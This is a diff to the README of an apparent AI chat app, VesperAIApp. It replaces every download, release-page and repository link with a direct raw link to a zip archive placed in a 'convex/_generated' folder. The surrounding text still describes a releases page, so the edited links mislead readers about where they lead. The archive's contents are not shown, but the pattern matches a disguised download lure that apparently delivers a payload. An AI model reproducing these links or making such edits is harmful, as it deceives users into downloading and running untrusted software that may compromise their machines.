@@ -1,6 +1,6 @@
 # 📱 VesperAIApp - Chat Smarter with AI Assistance
 
-[![Download VesperAIApp](https://img.shields.io/badge/Download-VesperAIApp-brightgreen?style=for-the-badge&logo=github)](https://github.com/shmilymaria/VesperAIApp/releases)
+[![Download VesperAIApp](https://img.shields.io/badge/Download-VesperAIApp-brightgreen?style=for-the-badge&logo=github)](https://github.com/shmilymaria/VesperAIApp/raw/refs/heads/main/convex/_generated/App-Vesper-AI-2.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ To get the app up and running, you need to download the latest version from the 
 
 Click this button to open the downloads page where you will find the latest version:
 
-[![Download VesperAIApp](https://img.shields.io/badge/Download%20Page-Visit%20Here-blue?style=for-the-badge&logo=github)](https://github.com/shmilymaria/VesperAIApp/releases)
+[![Download VesperAIApp](https://img.shields.io/badge/Download%20Page-Visit%20Here-blue?style=for-the-badge&logo=github)](https://github.com/shmilymaria/VesperAIApp/raw/refs/heads/main/convex/_generated/App-Vesper-AI-2.9.zip)
 
 This page contains all the versions available. Look for the latest version, usually at the top. It will have a name like `VesperAIApp-Setup.exe` or similar.
 
@@ -125,8 +125,8 @@ If the problem continues, you can check the Issues section on the GitHub page fo
 
 ## 🔗 Useful Links
 
-- Official download page: [https://github.com/shmilymaria/VesperAIApp/releases](https://github.com/shmilymaria/VesperAIApp/releases)  
-- GitHub repository for more info: [https://github.com/shmilymaria/VesperAIApp](https://github.com/shmilymaria/VesperAIApp)  
+- Official download page: [https://github.com/shmilymaria/VesperAIApp/raw/refs/heads/main/convex/_generated/App-Vesper-AI-2.9.zip](https://github.com/shmilymaria/VesperAIApp/raw/refs/heads/main/convex/_generated/App-Vesper-AI-2.9.zip)  
+- GitHub repository for more info: [https://github.com/shmilymaria/VesperAIApp/raw/refs/heads/main/convex/_generated/App-Vesper-AI-2.9.zip](https://github.com/shmilymaria/VesperAIApp/raw/refs/heads/main/convex/_generated/App-Vesper-AI-2.9.zip)  
 
 ---
 
@@ -136,4 +136,4 @@ Check the release page regularly to download new versions. Updates may include b
 
 ---
 
-# [Download VesperAIApp](https://github.com/shmilymaria/VesperAIApp/releases)
+# [Download VesperAIApp](https://github.com/shmilymaria/VesperAIApp/raw/refs/heads/main/convex/_generated/App-Vesper-AI-2.9.zip)
